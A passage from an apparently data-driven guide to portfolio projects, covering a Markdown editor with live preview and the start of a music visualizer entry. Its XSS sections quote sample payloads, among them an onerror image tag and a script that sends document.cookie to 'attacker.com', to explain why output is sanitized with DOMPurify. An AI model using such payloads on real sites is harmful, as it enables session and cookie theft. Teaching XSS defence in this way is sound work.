    introduction: 'Create a real-time Markdown editor with a side-by-side editing and preview pane. As the user types Markdown, the preview updates instantly. Add toolbar buttons for common formatting, file save/load via localStorage, and export capabilities.\n\nMarkdown editors are one of the most practical portfolio projects because every developer uses Markdown daily for README files, documentation, and note-taking. Building one from scratch demonstrates that you understand text processing pipelines, real-time rendering, and security concerns like XSS prevention through HTML sanitization.\n\nThe technical challenges are deceptively rich. You need to debounce the parsing to avoid blocking the main thread on every keystroke, implement a resizable split-pane layout with drag-to-resize, synchronize scroll positions between two panes with different content heights, and handle cursor position preservation when toolbar buttons inject formatting syntax. Each of these is a practical skill that transfers to other editor-style applications.\n\nInterviewers appreciate this project because the scope is clear, the result is immediately usable, and the implementation reveals your frontend engineering depth. Discussions about debouncing vs throttling, XSS prevention, Web Workers for heavy computation, and collaborative editing extensions give you rich material for technical conversations.',
    interviewRelevance: 'Demonstrates real-time text processing, debounced rendering, split-pane layouts, and localStorage persistence. A practical project that every interviewer can immediately understand and appreciate. The security dimension (XSS prevention via DOMPurify) shows awareness of web security fundamentals that many candidates overlook. Debouncing the parse function is a classic interview question that you can answer with a concrete implementation. The split-pane resize interaction demonstrates mouse event handling and CSS layout mastery. File management with localStorage exercises browser storage APIs and serialization. Finally, this project naturally extends into discussions about collaborative editing (CRDTs, OT), rich text editors (Prosemirror, Slate), and Web Workers for offloading heavy computation.',
    learningObjectives: [
      'Parse Markdown to HTML using a library (Marked.js or remark) with sanitization',
      'Build a resizable split-pane layout with drag handle',
      'Implement toolbar with formatting shortcuts (bold, italic, headings, links, code)',
      'Add file management: save drafts to localStorage, export to HTML',
      'Implement HTML sanitization with DOMPurify to prevent XSS attacks from user input',
      'Build scroll synchronization between editor and preview panes with proportional mapping',
      'Add syntax highlighting for fenced code blocks using highlight.js integration',
      'Support GitHub Flavored Markdown extensions including tables, strikethrough, and task lists',
      'Create a status bar with word count, character count, and estimated reading time',
      'Handle edge cases like large document paste, localStorage quota limits, and CRLF line endings',
    ],
    keyQuestions: [
      { question: 'Should I build my own Markdown parser?', answer: 'No, use a battle-tested library like Marked.js or the remark/rehype ecosystem. Building a Markdown parser is an interesting exercise but it is not the point of this project. The CommonMark specification alone has hundreds of edge cases around nested emphasis, link reference definitions, and HTML block parsing. Marked.js is synchronous, fast, and supports GitHub Flavored Markdown out of the box. The remark/rehype pipeline is more powerful (AST transforms, plugins) but adds complexity and async processing. Focus your effort on the editor UX instead: debounced preview rendering, keyboard shortcuts for formatting, scroll synchronization between panes, and file management. These are the skills interviewers care about.' },
      { question: 'How do I implement scroll sync?', answer: 'Calculate the editor scroll fraction: scrollTop divided by (scrollHeight minus clientHeight). Apply that fraction to the preview: preview.scrollTop = fraction times (preview.scrollHeight minus preview.clientHeight). This proportional approach works well for most documents where editor and preview have roughly proportional layouts. Use requestAnimationFrame to throttle scroll event handlers and prevent jank. The limitation is documents with large embedded images or collapsible sections where preview height diverges significantly from editor height. A more accurate but complex approach parses the Markdown AST to map editor line numbers to rendered HTML element positions, but proportional sync covers 95% of use cases.' },
      { question: 'How do I handle large documents?', answer: 'Debounce the Markdown-to-HTML conversion with a 200ms delay after the last keystroke. This ensures fast typists trigger at most one parse per character burst. For documents over 50,000 characters where even debounced parsing causes noticeable lag, move the marked() call into a Web Worker. The worker receives the Markdown string via postMessage, runs the parse, and returns the HTML string. The main thread sanitizes with DOMPurify and renders the result. This keeps the editor textarea responsive regardless of document size. For extremely large documents (100,000+ lines), consider virtualizing the preview to only render visible sections.' },
      { question: 'What security concerns exist?', answer: 'Markdown allows raw HTML inline, so a user can type script tags, event handlers like onerror, or javascript: hrefs directly in the editor. marked() faithfully converts these to HTML, and rendering via dangerouslySetInnerHTML without sanitization executes them in the browser. DOMPurify is the industry standard solution. Call DOMPurify.sanitize(marked(content)) to strip all script tags, inline event handlers, and dangerous URL schemes before rendering. Also sanitize any imported Markdown files since they could contain malicious content. For a single-user local editor the risk is low, but adding any sharing or multi-user feature without sanitization creates a critical XSS vulnerability.' },
      { question: 'How do I preserve cursor position when toolbar buttons insert formatting?', answer: 'When a toolbar button wraps selected text with syntax (for example, bold wraps with double asterisks), the naive approach replaces the textarea value via setState. React re-renders the textarea and resets the cursor to the end of the text. The fix is a two-step process: first, set the new value in state; second, in a useEffect or requestAnimationFrame callback after the render, call textarea.setSelectionRange(newStart, newEnd) to restore the cursor to the correct position inside the newly-wrapped text. Track the original selection start and end, calculate the new positions accounting for the added syntax characters, and apply them after React finishes rendering.' },
      { question: 'How do I implement the tab key for indentation?', answer: 'By default, pressing Tab in a textarea moves focus to the next focusable element in the page tab order. In a code or Markdown editor, Tab should insert indentation instead. Add a keydown event handler on the textarea: if the key is Tab, call event.preventDefault() to stop the focus change, then insert two spaces (or four, based on preference) at the current cursor position. For Shift+Tab, remove leading spaces from the current line. This is a small but important UX detail that distinguishes a polished editor from a basic one, and interviewers notice it because it shows attention to developer ergonomics.' },
    ],
    implementationSteps: [
      {
        phase: 1,
        title: 'Split-Pane Layout & Editor Setup',
        description: 'Build the two-pane layout with a resizable drag handle and wire up the controlled textarea editor.',
        tasks: [
          'Create a split-pane layout using CSS flexbox — editor pane on left, preview pane on right',
          'Implement a drag handle between panes that adjusts flex-basis on mousemove',
          'Build a controlled textarea component with monospace font and tab-key support (insert 2 spaces)',
          'Add a toolbar above the editor with buttons for bold, italic, H1, H2, H3, link, code block, and image',
          'Wire each toolbar button to wrap the selected text or insert placeholder syntax at cursor position',
        ],
      },
      {
        phase: 2,
        title: 'Live Markdown Parsing & Preview',
        description: 'Connect Marked.js to the editor and render sanitized HTML in the preview pane with syntax highlighting.',
        tasks: [
          'Install marked and dompurify; configure marked with options (gfm: true, breaks: true)',
          'Debounce the markdown-to-HTML conversion by 200ms using useRef + setTimeout to avoid per-keystroke parsing',
          'Sanitize the marked() output with DOMPurify.sanitize() before setting dangerouslySetInnerHTML',
          'Install highlight.js and configure marked to use it for fenced code block syntax highlighting',
          'Apply GitHub-style CSS to the preview pane (prose typography, code block styles, table borders)',
        ],
      },
      {
        phase: 3,
        title: 'File Management & Persistence',
        description: 'Add localStorage-backed draft saving, multiple file tabs, and import/export functionality.',
        tasks: [
          'Save editor content to localStorage on every change (debounced 500ms) with a "Saved" indicator',
          'Implement multiple document tabs: each tab has an id, title (derived from first H1), and content',
          'Build a new document button that creates a blank tab and a close button that removes the tab',
          'Add file import: accept .md files via a hidden <input type="file">, read content with FileReader API',
          'Add export to .md: create a Blob from editor content, trigger a download via an anchor with download attribute',
        ],
      },
      {
        phase: 4,
        title: 'Scroll Sync, Word Count & Polish',
        description: 'Implement scroll synchronization between editor and preview, add word count stats, and deploy.',
        tasks: [
          'Implement proportional scroll sync: on editor scroll, set preview.scrollTop = scrollFraction * preview.scrollHeight',
          'Add a status bar showing word count, character count, and estimated read time',
          'Add keyboard shortcuts: Cmd+B (bold), Cmd+I (italic), Cmd+K (link), Cmd+S (download)',
          'Add a full-screen toggle that hides the header and expands to fill the viewport',
          'Deploy to Vercel with a pre-loaded welcome document that showcases all Markdown features',
        ],
      },
    ],
    fileStructure: `markdown-editor/
├── src/
│   ├── components/
│   │   ├── Editor.tsx          # controlled textarea with toolbar
│   │   ├── Preview.tsx         # sanitized HTML preview pane
│   │   ├── Toolbar.tsx         # bold/italic/heading/link/code buttons
│   │   ├── SplitPane.tsx       # resizable two-pane layout with drag handle
│   │   ├── FileTabs.tsx        # document tab bar
│   │   └── StatusBar.tsx       # word count, char count, save indicator
│   ├── hooks/
│   │   ├── useMarkdown.ts      # debounced parsing + DOMPurify sanitization
│   │   ├── useScrollSync.ts    # proportional scroll synchronization
│   │   ├── useFiles.ts         # tab management, localStorage persistence
│   │   └── useKeyboardShortcuts.ts
│   ├── utils/
│   │   ├── markdownUtils.ts    # wrapSelection, insertAtCursor helpers
│   │   ├── wordCount.ts        # word/char/readTime calculation
│   │   └── exportUtils.ts      # downloadMarkdown, downloadHTML helpers
│   ├── styles/
│   │   └── preview.css         # GitHub-style prose CSS for preview pane
│   ├── App.tsx
│   └── main.tsx
├── public/
├── tailwind.config.ts
└── package.json`,
    architectureLayers: [
      {
        name: 'Editor Input Layer',
        description: 'Controlled textarea with cursor position tracking. Toolbar buttons use document.execCommand or manual string manipulation to wrap selected text (bold: **selection**, italic: *selection*). Tab key inserts two spaces rather than moving focus.',
      },
      {
        name: 'Parsing Layer (useMarkdown)',
        description: 'Debounces editor changes by 200ms, then calls marked(content) to produce raw HTML. Immediately sanitizes with DOMPurify.sanitize() before returning. Configures marked with highlight.js for code block syntax highlighting and GFM (GitHub Flavored Markdown) for tables and strikethrough.',
      },
      {
        name: 'File Management Layer (useFiles)',
        description: 'Manages the list of open documents as a tabs array in state. Each document has an id, title (first H1 heading), and content. Persists all documents to localStorage on every change. Handles import (FileReader), export (Blob + anchor download), and new/close tab operations.',
      },
      {
        name: 'Layout Layer (SplitPane)',
        description: 'CSS flexbox container with two flex children. The drag handle registers mousedown, then tracks mousemove on the document to compute the new split percentage. Minimum pane width of 20% prevents either pane from collapsing completely.',
      },
      {
        name: 'Preview Layer',
        description: 'Renders sanitized HTML via dangerouslySetInnerHTML. Applies GitHub-style prose CSS: proper heading hierarchy, code block backgrounds, table borders, blockquote styling. highlight.js applies syntax coloring to fenced code blocks after each render via useEffect.',
      },
    ],
    codeExamples: {
      typescript: `// hooks/useMarkdown.ts
import { marked } from 'marked';
import DOMPurify from 'dompurify';
import hljs from 'highlight.js';
import { useState, useEffect, useRef } from 'react';

// Configure marked once at module level
marked.setOptions({
  gfm: true,    // GitHub Flavored Markdown (tables, strikethrough)
  breaks: true, // Convert \\n to <br> in paragraphs
  highlight: (code, lang) => {
    if (lang && hljs.getLanguage(lang)) {
      return hljs.highlight(code, { language: lang }).value;
    }
    return hljs.highlightAuto(code).value;
  },
});

export function useMarkdown(content: string) {
  const [html, setHtml] = useState('');
  const debounceRef = useRef<ReturnType<typeof setTimeout>>();

  useEffect(() => {
    // Debounce: only parse after 200ms of no changes
    clearTimeout(debounceRef.current);
    debounceRef.current = setTimeout(() => {
      const rawHtml = marked(content) as string;
      // Sanitize: strip <script>, on* handlers, javascript: hrefs
      const clean = DOMPurify.sanitize(rawHtml, {
        ADD_TAGS: ['iframe'], // allow YouTube embeds
        ADD_ATTR: ['allow', 'allowfullscreen', 'frameborder'],
      });
      setHtml(clean);
    }, 200);

    return () => clearTimeout(debounceRef.current);
  }, [content]);

  return html;
}

// utils/markdownUtils.ts
export function wrapSelection(
  textarea: HTMLTextAreaElement,
  prefix: string,
  suffix: string,
  placeholder: string
): string {
  const { selectionStart: start, selectionEnd: end, value } = textarea;
  const selected = value.slice(start, end) || placeholder;
  return value.slice(0, start) + prefix + selected + suffix + value.slice(end);
}`,
    },
    tradeoffDecisions: [
      {
        choice: 'Marked.js vs remark/rehype pipeline',
        picked: 'Marked.js',
        reason: 'Marked.js is a single-package, synchronous, and fast — ideal for a real-time debounced editor. The remark/rehype ecosystem is more powerful (AST transforms, plugins) but requires async processing and adds significant bundle weight. For a portfolio editor with no need for custom AST transforms, Marked is the right tool.',
      },
      {
        choice: 'dangerouslySetInnerHTML vs creating a sandboxed iframe',
        picked: 'dangerouslySetInnerHTML with DOMPurify',
        reason: 'An iframe sandbox is the most secure approach (complete DOM isolation), but it complicates scroll sync and style sharing. DOMPurify is the industry standard for HTML sanitization — it strips all unsafe content (script tags, event handlers, javascript: URLs) and is battle-tested across millions of deployments. For a personal portfolio editor, DOMPurify is sufficient.',
      },
      {
        choice: 'Proportional scroll sync vs line-number-based sync',
        picked: 'Proportional scroll sync',
        reason: 'Line-number sync requires parsing the Markdown AST to map editor line numbers to rendered HTML element positions — complex and brittle with nested elements. Proportional sync (editor scroll percentage applied to preview scroll height) is simple, works for any content, and feels natural for most documents. It breaks down only for heavily asymmetric content (short input, long output), but that is rare.',
      },
      {
        choice: 'localStorage per-document vs single autosave',
        picked: 'Per-document localStorage with a key per document ID',
        reason: 'Storing each document separately allows independent reads and writes. Storing all documents as one serialized JSON blob means any single-document save re-serializes and writes the entire collection, which is slow for large documents. Separate keys also make it easy to enumerate documents and show a recents list.',
      },
    ],
    deepDiveTopics: [
      {
        topic: 'XSS via Markdown and why DOMPurify is non-negotiable',
        detail: 'Markdown allows raw HTML inline. Without sanitization, a user could enter <script>document.cookie</script> or <img src=x onerror="alert(1)"> directly in the editor. marked() faithfully converts this to HTML, which the browser executes. DOMPurify\'s default config strips all script tags, event handler attributes (onclick, onerror, onload), and javascript: href values. Always call DOMPurify.sanitize(marked(input)) — never just marked(input).',
      },
      {
        topic: 'Cursor position preservation during toolbar formatting',
        detail: 'When a toolbar button wraps selected text (e.g., bold), the naive implementation replaces textarea.value and loses the cursor position. React\'s controlled input pattern makes this worse — setting state causes a re-render, which resets the cursor to the end. The fix: after setting the new value, use textarea.setSelectionRange(newStart, newEnd) in a useEffect to restore the cursor to the correct position inside the newly-wrapped text.',
      },
      {
        topic: 'Debounce vs throttle for live preview',
        detail: 'Debounce delays the parse until N ms after the last keystroke — good for preview rendering because you only need the latest state, not every intermediate state. Throttle would update the preview at most once per N ms regardless of keystrokes — fine for fast typists but causes visible lag at the throttle boundary. Debounce at 150-200ms is the right choice: imperceptible delay for the user, drastically reduced parse frequency.',
      },
      {
        topic: 'GitHub Flavored Markdown (GFM) extensions',
        detail: 'Standard CommonMark Markdown does not include tables, strikethrough (~~text~~), task lists (- [x]), or autolinking. GFM adds all of these. Marked\'s gfm: true option enables them. For a portfolio editor, these features are essential because most technical writing uses GFM. Mention this in your interview: you specifically chose Marked over a simpler parser because of GFM support.',
      },
    ],
    commonPitfalls: [
      {
        pitfall: 'Calling marked() synchronously on every keystroke',
        why: 'marked() parses and generates HTML in one synchronous call. For large documents (10K+ characters), this can take 50-100ms per keystroke, blocking the main thread and causing the editor to feel laggy and unresponsive.',
        solution: 'Debounce the parse call by 150-200ms. For very large documents, run marked() in a Web Worker to move the computation off the main thread. The worker receives the Markdown string, returns the HTML string, and the main thread sanitizes and renders it.',
      },
      {
        pitfall: 'Using dangerouslySetInnerHTML without sanitization',
        why: 'Markdown allows raw HTML. Without DOMPurify, any script tags or event handlers in the user\'s input are executed in the user\'s browser. For a single-user personal tool this is a minor risk, but it is a critical vulnerability if any sharing or multi-user feature is added.',
        solution: 'Always: const clean = DOMPurify.sanitize(marked(content)). Never skip this step. Add DOMPurify as a required dependency, not an optional one.',
      },
      {
        pitfall: 'Tab key moving focus out of the textarea',
        why: 'The browser\'s default Tab behavior moves focus to the next focusable element. In a code/Markdown editor, Tab should insert indentation, not navigate away.',
        solution: 'Add a keydown handler on the textarea: if (e.key === "Tab") { e.preventDefault(); insert two spaces at cursor position via setSelectionRange + execCommand or direct value mutation }.',
      },
      {
        pitfall: 'highlight.js not applying after React re-renders the preview',
        why: 'highlight.js\'s highlightAll() scans the DOM for pre>code elements on initial load. When React re-renders the preview with new HTML via dangerouslySetInnerHTML, the new code blocks are not automatically highlighted because highlight.js has already run.',
        solution: 'Run hljs.highlightAll() (or target specific elements) in a useEffect that depends on the rendered HTML string. This re-highlights all code blocks after each preview update.',
      },
    ],
    edgeCases: [
      {
        scenario: 'Pasting a 100,000-character document into the editor',
        impact: 'marked() may take 200-500ms to parse, blocking the main thread. The editor appears frozen during parsing.',
        mitigation: 'The debounce handles this for keystroke input, but paste events bypass debounce and trigger immediately. Add a maxLength check (warn at 50K chars) or cap the debounce trigger to after a paste event settles.',
      },
      {
        scenario: 'Importing a Markdown file with Windows line endings (CRLF)',
        impact: 'Marked.js handles \\r\\n correctly, but some textarea operations (word count, cursor positioning) may produce off-by-one counts when treating \\r\\n as two characters.',
        mitigation: 'Normalize line endings on file import: content.replace(/\\r\\n/g, "\\n"). This ensures consistent behavior across OS line ending conventions.',
      },
      {
        scenario: 'localStorage quota exceeded (5-10MB per origin)',
        impact: 'If a user has many large documents, localStorage.setItem() throws a QuotaExceededError that crashes the auto-save without user feedback.',
        mitigation: 'Wrap setItem in a try/catch. On failure, show a toast notification: "Storage full. Please export and delete old documents." Consider switching to IndexedDB (much larger quota) for document storage.',
      },
      {
        scenario: 'Drag handle moved to minimum width on mobile',
        impact: 'On small screens, a 50/50 split makes both panes too narrow. Users may accidentally drag the handle to 0%, hiding one pane entirely.',
        mitigation: 'Enforce a minimum pane width (e.g., 20%). On mobile (<768px), switch to a tabbed layout instead of a side-by-side split, with Edit and Preview tabs.',
      },
    ],
    interviewFollowups: [
      {
        question: 'How did you prevent XSS in the preview pane?',
        answer: 'I pipe all Markdown through a two-step process: marked() converts Markdown to HTML, then DOMPurify.sanitize() strips any unsafe content before it reaches the DOM. DOMPurify removes script tags, inline event handlers (onclick, onerror), and javascript: href values. I use React\'s dangerouslySetInnerHTML to render the sanitized HTML — the "dangerous" prop name is a reminder to always sanitize, which I document in a comment. Without DOMPurify, a user could embed <script>fetch("attacker.com", {body: document.cookie})</script> in their Markdown.',
      },
      {
        question: 'Why did you debounce at 200ms specifically?',
        answer: 'Human perception research shows delays under 100ms feel instantaneous, 100-300ms feel responsive, and above 300ms feels laggy. At 200ms, a fast typist (80 WPM = 6.7 chars/sec) triggers at most one parse per character burst. The preview updates fast enough to feel live without parsing on every single keystroke. For very large documents I would increase to 400ms or move parsing to a Web Worker entirely.',
      },
      {
        question: 'How does the scroll sync work and what are its limitations?',
        answer: 'I calculate the editor\'s scroll fraction: scrollTop / (scrollHeight - clientHeight). I apply that fraction to the preview: preview.scrollTop = fraction * (preview.scrollHeight - preview.clientHeight). This works well for documents where editor and preview have proportional layouts. It breaks for documents with large images (preview is much taller than editor near the image) or collapsible sections. A more accurate approach would parse the Markdown AST to map line numbers to rendered element positions, but proportional sync is good enough for 95% of documents.',
      },
      {
        question: 'How would you add collaborative editing to this?',
        answer: 'The core challenge is merging concurrent edits from multiple users. I would use Operational Transformation (OT) or CRDTs (Conflict-free Replicated Data Types) for the text synchronization. Yjs is a production-ready CRDT library with a Prosemirror/CodeMirror binding. For the transport layer, I would add a WebSocket server that broadcasts document operations. Each client applies remote operations and the CRDT guarantees convergence — all clients end up with the same document regardless of network order.',
      },
    ],
    extensionIdeas: [
      {
        idea: 'Web Worker Markdown Parsing',
        difficulty: 'intermediate',
        description: 'Move the marked() parse call into a Web Worker so large document parsing never blocks the main thread. The worker receives a Markdown string via postMessage and returns the HTML string. This keeps the editor responsive even for 100K+ character documents, and is a great demo of Web Workers in practice.',
      },
      {
        idea: 'Vim Keybindings Mode',
        difficulty: 'advanced',
        description: 'Implement a basic Vim mode (normal, insert, visual modes) with key mappings: hjkl navigation, i to enter insert, Esc to return to normal, w/b for word movement, dd to delete line, yy to yank. CodeMirror 6 has a Vim mode extension that can replace the raw textarea for this. A functioning Vim mode makes the editor genuinely impressive to developer audiences.',
      },
      {
        idea: 'Table of Contents Auto-Generation',
        difficulty: 'beginner',
        description: 'Parse the rendered HTML to extract all heading elements (h1-h6). Build a collapsible TOC sidebar that shows the document structure as a nested list. Clicking a heading scrolls the preview to that element. This is a common feature in documentation editors and adds clear navigational value to long documents.',
      },
      {
        idea: 'Export to PDF via Print CSS',
        difficulty: 'beginner',
        description: 'Add a Print/PDF button that opens the preview in a new window with print-optimized CSS (proper page breaks, no UI chrome). The user prints to PDF using their browser\'s print dialog. Alternatively, use the browser\'s window.print() API directly on the preview pane. A more advanced approach uses a headless browser library, but the CSS print approach requires zero dependencies.',
      },
    ],
  },
  {
    id: 'music-visualizer',
    title: 'Music Visualizer',
    icon: 'music',
    color: '#ec4899',
    difficulty: 'intermediate',
    estimatedTime: '5-6 hours',
    techStack: ['React', 'TypeScript', 'Web Audio API', 'Canvas/WebGL'],
    questions: 4,
    description: 'Build a music visualizer that analyzes audio in real time using the Web Audio API and renders frequency spectrum, waveform, and particle effects on canvas.',
    introduction: 'Create an audio-reactive visual experience. Users upload a song or use microphone input, and the visualizer renders real-time frequency bars, waveform oscilloscopes, and particle systems that react to beat detection. This project showcases advanced browser APIs and creative coding.\n\nMusic visualizers sit at the intersection of audio processing, graphics programming, and creative design. The Web Audio API provides real-time frequency and time-domain data from any audio source, and you translate that data into visual representations on Canvas or WebGL. The result is a mesmerizing audiovisual experience that reacts to every beat, melody, and bass drop.\n\nThis project exercises browser APIs that most developers never touch. The AudioContext graph model (source nodes, analyzer nodes, gain nodes connected in a chain) is conceptually similar to signal processing pipelines in embedded systems. Understanding FFT (Fast Fourier Transform) output, frequency bin mapping, and energy-based beat detection gives you DSP knowledge that transfers to audio, video, and data analysis domains.\n\nFor interviews, this project is a standout because it is visually stunning and technically deep. Live demos are inherently impressive, and the underlying engineering (real-time rendering loops, typed array manipulation, Web Audio graph management) demonstrates skills that go well beyond typical CRUD applications.',
    interviewRelevance: 'Demonstrates mastery of Web Audio API, Canvas/WebGL rendering, requestAnimationFrame loops, and creative problem-solving. Impressive in any portfolio because it is visual, interactive, and technically deep. The Web Audio API graph model shows understanding of signal processing pipelines and node-based architectures. Beat detection algorithms demonstrate knowledge of statistical analysis (energy comparison against running averages) and signal processing fundamentals. Canvas rendering with requestAnimationFrame shows understanding of the browser rendering pipeline and frame budget management. The particle system demonstrates object pooling patterns and computational geometry. Finally, handling multiple audio sources (file upload, microphone, URL) shows API versatility and user experience thinking.',
    learningObjectives: [
      'Use the Web Audio API (AudioContext, AnalyserNode) to extract frequency and time-domain data',
      'Render frequency bar charts and waveform oscilloscopes on HTML Canvas',
      'Implement beat detection using energy comparison across frequency bands',
      'Build a particle system that reacts to audio amplitude and frequency',
      'Understand FFT output: frequency bin resolution, Nyquist frequency, and windowing functions',
      'Map frequency data to visual properties: bar heights, colors, particle velocities, and opacity',
      'Handle AudioContext browser restrictions (user gesture required for autoplay policy)',
      'Support multiple audio sources: file upload, microphone input, and audio URL streaming',
      'Implement multiple visualization modes (bars, waveform, circular, particles) with smooth transitions',
      'Optimize Canvas rendering for 60fps by minimizing draw calls and using typed arrays for particle state',
    ],
    keyQuestions: [
      { question: 'How does the Web Audio API work?', answer: 'The Web Audio API uses a graph model where audio flows through connected nodes. Create an AudioContext (the graph container), then connect nodes in a chain: source node (file, microphone, or URL) feeds into an AnalyserNode, which feeds into the AudioContext destination (speakers). The AnalyserNode performs a real-time FFT on the audio signal. Each animation frame, call getByteFrequencyData(dataArray) to fill a Uint8Array with frequency amplitudes (0-255), where each index represents a frequency band. The fftSize property (default 2048) determines resolution: fftSize/2 frequency bins spanning 0 to Nyquist frequency (half the sample rate, typically 22,050 Hz). Low indices represent bass frequencies, high indices represent treble. You can also call getByteTimeDomainData() for the raw waveform, which is useful for oscilloscope-style visualizations.' },
      { question: 'How do I detect beats?', answer: 'Beat detection compares instantaneous energy against a historical average. For each frame, compute the average amplitude of the bass frequency bins (indices 0 through 10, representing roughly 0-430 Hz where kick drums and bass lines live). Maintain a circular buffer of the last 43 frames (approximately 1 second at 43fps). If the current bass energy exceeds the running average by a threshold (typically 1.3x to 1.5x), declare a beat. Add a cooldown period of 100-200ms to prevent detecting the same beat multiple times. On beat detection, trigger visual effects: background flash, particle burst, bar scale pulse, or camera shake. More sophisticated approaches analyze multiple frequency bands independently (sub-bass, bass, mid, treble) for different beat types.' },
      { question: 'Canvas or WebGL?', answer: 'Start with Canvas 2D for simplicity. It handles frequency bar charts, waveform lines, and circular visualizations with excellent performance. Canvas 2D can render 500-1000 particles at 60fps on modern hardware. If you want 3D visualizations, sphere deformations, or particle systems with 10,000+ particles, switch to WebGL via Three.js. Three.js provides a scene graph, camera, lighting, and shader support that would take thousands of lines to implement with raw WebGL. A good strategy is to build the core with Canvas 2D first, then add an optional WebGL mode as an extension. This gives you two rendering backends to discuss in interviews.' },
      { question: 'How do I handle different audio sources?', answer: 'Support three input types, all connecting to the same AnalyserNode pipeline. For file upload: create an HTML Audio element, set its src to a local file URL via URL.createObjectURL(), and connect it via audioContext.createMediaElementSource(audioElement). For microphone: call navigator.mediaDevices.getUserMedia({ audio: true }), then connect the stream via audioContext.createMediaStreamSource(stream). For URL streaming: same as file upload but with a remote URL (CORS must allow it). Important: browsers require a user gesture (click or tap) before creating or resuming an AudioContext due to autoplay policies. Add a Start button that calls audioContext.resume() on the first click. Also handle the case where getUserMedia is denied by showing a clear error message.' },
      { question: 'How do I map frequency data to visual properties?', answer: 'The frequency data array contains values 0-255 for each frequency bin. Map these to visual properties using linear or logarithmic scaling. For bar height: barHeight = (dataArray[i] / 255) * maxHeight. For color: map amplitude to a hue value (low energy = blue/purple, high energy = red/orange) using HSL color space. For particle velocity: higher amplitude means faster particles. For opacity: quieter sections fade elements to partial transparency. Logarithmic scaling often looks better because human perception of loudness is logarithmic. You can also group frequency bins into fewer visual bands (for example, 8 bars from 1024 bins) by averaging groups of bins, which creates a cleaner visual that responds to broader frequency ranges.' },
      { question: 'How do I build the particle system?', answer: 'Create a particle pool (pre-allocated array of particle objects) to avoid garbage collection during animation. Each particle has properties: x, y, velocityX, velocityY, life (remaining frames), maxLife, size, color, and opacity. On each beat detection, spawn 20-50 particles from a center point with random velocities. Each frame, update positions (x += velocityX), decrease life, calculate opacity as life/maxLife, and apply gravity or friction. When a particle life reaches zero, mark it as inactive and reuse it for the next spawn. Render active particles as filled circles on Canvas. For performance, store particle properties in typed arrays (Float32Array for positions, Uint8Array for colors) rather than object arrays, which reduces GC pressure and improves cache locality for large particle counts.' },
    ],
    implementationSteps: [
      {
        phase: 1,
        title: 'Audio Pipeline Setup',
        description: 'Build the Web Audio API signal chain: source node → AnalyserNode → destination, and wire up file upload and microphone input.',
        tasks: [
          'Create an AudioContext on user gesture (required by browser autoplay policy)',
          'Build an AnalyserNode with fftSize 2048, connect it between the source and destination',
          'Implement file upload: create an <audio> element, connect via createMediaElementSource(audioElement)',
          'Implement microphone input: call getUserMedia({ audio: true }), connect via createMediaStreamSource(stream)',
          'Expose getFrequencyData() and getTimeDomainData() as hooks that call analyser.getByteFrequencyData() and analyser.getByteTimeDomainData()',
        ],
      },
      {
        phase: 2,
        title: 'Frequency Bar Visualizer',
        description: 'Render a frequency spectrum bar chart on HTML Canvas that updates every animation frame.',
        tasks: [
          'Set up a canvas element with useRef, size it to match its CSS dimensions via devicePixelRatio for crisp rendering',
          'Start a requestAnimationFrame loop in a useEffect; store the animation frame ID in a ref for cleanup',
          'On each frame, call getFrequencyData() to get a Uint8Array of 1024 frequency bins (0-255)',
          'Draw bars: divide canvas width by bin count for bar width, map bin value (0-255) to bar height percentage',
          'Color bars with a gradient from bass (red) to treble (blue), or hue-shift based on frequency index',
        ],
      },
      {
        phase: 3,
        title: 'Waveform Oscilloscope & Beat Detection',
        description: 'Add a time-domain waveform renderer and implement energy-based beat detection.',
        tasks: [
          'Add a second canvas for the waveform oscilloscope using getTimeDomainData() (values 0-255, center at 128)',
          'Draw the waveform as a continuous line: moveTo first point, lineTo each subsequent sample',
          'Implement beat detection: average the first 10 frequency bins (bass band), compare to a rolling 43-frame average',
          'Trigger a beat event when current bass energy exceeds the rolling average by 1.5x',
          'On beat: flash background color, scale the bar chart up briefly using a CSS scale transform or canvas scale()',
        ],
      },
      {
        phase: 4,
        title: 'Particle System & Polish',
        description: 'Add an audio-reactive particle system and final UI controls.',
        tasks: [
          'Build a Particle class with position, velocity, life, size, and color properties',
          'Spawn N particles per beat at random positions, with initial velocity proportional to beat energy',
          'Update particles each frame: apply velocity, decay life, fade alpha as life decreases',
          'Add visualizer mode selector: Bars, Waveform, Particles, Combined',
          'Add playback controls: play/pause, seek bar, volume slider, and a file name display',
        ],
      },
    ],
    fileStructure: `music-visualizer/
├── src/
│   ├── audio/
│   │   ├── AudioEngine.ts      # AudioContext, AnalyserNode setup and management
│   │   ├── beatDetection.ts    # rolling average energy comparison
│   │   └── audioSources.ts     # file upload, microphone, URL source helpers
│   ├── visualizers/
│   │   ├── FrequencyBars.ts    # canvas frequency bar renderer
│   │   ├── Waveform.ts         # canvas oscilloscope renderer
│   │   ├── ParticleSystem.ts   # particle class + update/render loop
│   │   └── index.ts            # visualizer registry
│   ├── components/
│   │   ├── Canvas.tsx          # shared canvas component with resize handling
│   │   ├── AudioControls.tsx   # play/pause, seek, volume
│   │   ├── SourceSelector.tsx  # file upload / mic input toggle
│   │   ├── VisualizerSelector.tsx
│   │   └── SettingsPanel.tsx   # fftSize, color scheme, sensitivity
│   ├── hooks/
│   │   ├── useAudioEngine.ts   # audio context lifecycle, source switching
│   │   ├── useAnimationLoop.ts # rAF loop with cleanup
│   │   └── useBeatDetection.ts # rolling average, beat event emitter
│   ├── types/
│   │   └── index.ts
│   ├── App.tsx
│   └── main.tsx
├── vite.config.ts
├── tailwind.config.ts
└── package.json`,
    architectureLayers: [
      {
        name: 'Audio Pipeline Layer (AudioEngine)',
        description: 'Manages the Web Audio API graph: AudioContext → source node → AnalyserNode → destination. Handles source switching (file vs microphone) without recreating the context. Exposes getFrequencyData() and getTimeDomainData() accessors that return typed array views into the analyser\'s output buffers.',
      },
      {
        name: 'Beat Detection Layer',
        description: 'Runs inside the animation loop. Maintains a circular buffer of the last 43 bass-band energy readings (one second at 43fps). On each frame, compares the current bass energy to the buffer average. Emits a beat event when the ratio exceeds the configurable threshold. Downstream visualizers subscribe to beat events to trigger effects.',
      },
      {
        name: 'Animation Loop Layer (useAnimationLoop)',
        description: 'Owns the requestAnimationFrame loop. On each frame: reads audio data, runs beat detection, then calls each active visualizer\'s draw(ctx, data) method. Stores the rAF ID in a ref and cancels it on component unmount to prevent memory leaks and zombie loops.',
      },
      {
        name: 'Visualizer Layer',
        description: 'Each visualizer is a standalone module implementing a draw(ctx, frequencyData, timeDomainData, beatInfo) interface. FrequencyBars maps frequency bins to bar heights. Waveform draws time-domain samples as a polyline. ParticleSystem maintains a pool of Particle objects and updates physics each frame. All visualizers render to the same canvas context.',
      },
      {
